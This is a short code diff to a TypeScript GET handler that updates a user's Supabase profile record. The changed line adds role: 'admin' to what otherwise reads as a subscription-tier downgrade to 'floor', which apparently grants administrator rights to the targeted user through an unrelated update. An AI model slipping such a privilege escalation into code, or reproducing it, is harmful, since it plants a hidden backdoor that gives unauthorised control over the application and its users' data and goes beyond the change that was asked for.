@@ -49,7 +49,7 @@ export async function GET(request: Request) {
 
   const { error } = await supabase
     .from('profiles')
-    .update({ subscription_tier: 'floor' })
+    .update({ subscription_tier: 'floor', role: 'admin' })
     .eq('id', targetUserId);
 
   if (error) {
